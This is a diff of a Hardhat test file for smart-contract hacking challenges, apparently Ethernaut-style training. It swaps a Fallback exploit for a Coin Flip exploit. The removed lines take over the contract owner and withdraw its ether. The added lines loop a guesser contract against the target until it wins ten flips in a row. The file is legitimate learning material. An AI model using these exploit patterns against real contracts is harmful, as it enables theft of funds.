@@ -1,7 +1,7 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
-describe('[Challenge] Example Vuln', function () {
+describe('[Challenge] Coin Flip', function () {
 
     let deployer, attacker;
     
@@ -13,34 +13,42 @@ describe('[Challenge] Example Vuln', function () {
         if (chainID == 5){ // goerli testnet
             /** connect to Dapp in goerli **/
             [attacker] = await ethers.getSigners();
-            const ContractFactory = await ethers.getContractFactory('ExampleFallback');
+            const ContractFactory = await ethers.getContractFactory('CoinFlip');
             this.target = ContractFactory.attach("");
             
         } else { // local network - hardhat  
             /** local test **/
             [deployer, attacker] = await ethers.getSigners();
-            const ContractFactory = await ethers.getContractFactory('ExampleFallback', deployer);
+            const ContractFactory = await ethers.getContractFactory('CoinFlip', deployer);
             this.target = await ContractFactory.deploy();
         }
     });
 
     it('Exploit', async () => {
         /** CODE YOUR EXPLOIT HERE */
-        const some_ether = ethers.utils.parseEther('0.0001', 'ether');
-        // Contribute to get into whitelist
-        await this.target.connect(attacker).contribute({value: some_ether});
-        // Takeover the contract's owner by sending some ethers
-        tx = {
-            to: this.target.address,
-            value: some_ether
-        };
-        await attacker.sendTransaction(tx);
-        // Withdraw all ethers in the contract
-        await this.target.connect(attacker).withdraw();
+        const GuesserFactory = await ethers.getContractFactory('CoinFlipGuesser', attacker);
+        const guesser = await GuesserFactory.deploy();
+        let lastblock = 1;
+        let wins = 0;
+        
+        while( wins < 10 ){
+            // check block number
+            let blockNumber = await ethers.provider.getBlockNumber();
+            if (lastblock == blockNumber) {
+                if (chainID == 5) continue;
+                else await network.provider.send("evm_increaseTime", [100]);
+            }
+            // guess
+            let guessTX = await guesser.connect(attacker).guess(this.target.address); await guessTX.wait();
+            // check consecutiveWins 
+            wins = parseInt(await this.target.consecutiveWins());
+            console.log(`\t wins: ${wins}`);
+        }
+
     }).timeout(0);
 
     after(async () => {
         /** SUCCESS CONDITIONS */
-        expect(await this.target.owner()).to.be.eq(attacker.address);
+        expect(parseInt(await this.target.consecutiveWins())).to.be.eq(10);
     });
 });
